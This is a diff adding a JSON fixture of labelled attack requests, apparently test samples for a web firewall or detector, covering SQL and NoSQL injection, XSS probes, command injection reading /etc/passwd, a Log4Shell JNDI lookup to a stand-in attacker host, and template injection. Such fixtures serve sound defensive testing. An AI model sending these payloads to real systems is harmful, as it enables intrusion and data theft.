@@ -1,0 +1,96 @@
+{
+  "samples": [
+    {
+      "id": "sqli-union-select",
+      "category": "sqli",
+      "method": "GET",
+      "uri": "/search?q=1%20union%20select%20password%20from%20users",
+      "headers": { "User-Agent": "Mozilla/5.0" },
+      "args": { "q": ["1 union select password from users"] }
+    },
+    {
+      "id": "sqli-tautology-login",
+      "category": "sqli",
+      "method": "POST",
+      "uri": "/login",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0" },
+      "args": { "username": ["admin"], "password": ["' or 1=1 --"] },
+      "body": "username=admin&password=' or 1=1 --"
+    },
+    {
+      "id": "sqli-time-delay",
+      "category": "sqli",
+      "method": "GET",
+      "uri": "/item?id=1%20and%20sleep(5)",
+      "headers": { "User-Agent": "Mozilla/5.0" },
+      "args": { "id": ["1 and sleep(5)"] }
+    },
+    {
+      "id": "nosqli-where",
+      "category": "sqli",
+      "method": "POST",
+      "uri": "/api/users/search",
+      "headers": { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0" },
+      "args": { "filter": ["{\"$where\":\"sleep(1000)\"}"] },
+      "body": "{\"filter\":{\"$where\":\"sleep(1000)\"}}"
+    },
+    {
+      "id": "xss-script-tag",
+      "category": "xss",
+      "method": "GET",
+      "uri": "/comment?text=%3Cscript%3Ealert(1)%3C/script%3E",
+      "headers": { "User-Agent": "Mozilla/5.0" },
+      "args": { "text": ["<script>alert(1)</script>"] }
+    },
+    {
+      "id": "xss-img-onerror",
+      "category": "xss",
+      "method": "POST",
+      "uri": "/profile",
+      "headers": { "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0" },
+      "args": { "bio": ["<img src=x onerror=alert(1)>"] },
+      "body": "bio=<img src=x onerror=alert(1)>"
+    },
+    {
+      "id": "xss-svg-onload",
+      "category": "xss",
+      "method": "GET",
+      "uri": "/render?html=%3Csvg%20onload%3Dalert(1)%3E",
+      "headers": { "User-Agent": "Mozilla/5.0" },
+      "args": { "html": ["<svg onload=alert(1)>"] }
+    },
+    {
+      "id": "rce-command-chain",
+      "category": "rce",
+      "method": "GET",
+      "uri": "/debug?cmd=ping%20127.0.0.1%3Bcat%20/etc/passwd",
+      "headers": { "User-Agent": "Mozilla/5.0" },
+      "args": { "cmd": ["ping 127.0.0.1;cat /etc/passwd"] }
+    },
+    {
+      "id": "rce-pipe-id",
+      "category": "rce",
+      "method": "GET",
+      "uri": "/run?cmd=echo%20ok%7Cid",
+      "headers": { "User-Agent": "Mozilla/5.0" },
+      "args": { "cmd": ["echo ok|id"] }
+    },
+    {
+      "id": "rce-log4shell-jndi",
+      "category": "rce",
+      "method": "GET",
+      "uri": "/",
+      "headers": { "User-Agent": "${jndi:ldap://attacker.test/a}" },
+      "args": { "x": ["${jndi:ldap://attacker.test/a}"] }
+    },
+    {
+      "id": "rce-ssti",
+      "category": "rce",
+      "method": "POST",
+      "uri": "/template/preview",
+      "headers": { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0" },
+      "args": { "template": ["{{7*7}}"] },
+      "body": "{\"template\":\"{{7*7}}\"}"
+    }
+  ]
+}
